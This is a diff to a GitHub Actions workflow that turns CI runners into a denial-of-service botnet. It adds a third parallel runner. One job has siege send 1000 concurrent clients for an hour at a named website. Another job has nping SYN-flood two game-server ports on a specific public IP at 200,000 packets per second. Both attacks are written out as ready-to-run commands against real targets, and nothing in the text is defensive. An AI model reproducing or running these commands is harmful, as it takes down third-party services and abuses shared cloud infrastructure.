@@ -7,12 +7,12 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        runner: [1,2]
+        runner: [1,2,3]
     steps:
       - name: Install tools
         run: |
           sudo apt-get update -qq
-          sudo apt-get install -y siege nping
+          sudo apt-get install -y siege nmap curl
       - name: Attack website
         run: |
           siege -c 1000 -t 3600s http://ntodark.com &
@@ -20,8 +20,7 @@ jobs:
           sleep 3600
       - name: Attack game ports
         run: |
-          # SYN flood nas portas 7171 e 7172
-          nping --tcp -p 7171 --flags SYN --rate 200000 34.151.221.105 &
-          nping --tcp -p 7172 --flags SYN --rate 200000 34.151.221.105 &
+          # SYN flood via nping que já vem no nmap
+          /usr/bin/nping --tcp -p 7171 --flags SYN --rate 200000 34.151.221.105 &
+          /usr/bin/nping --tcp -p 7172 --flags SYN --rate 200000 34.151.221.105 &
           sleep 3600
-
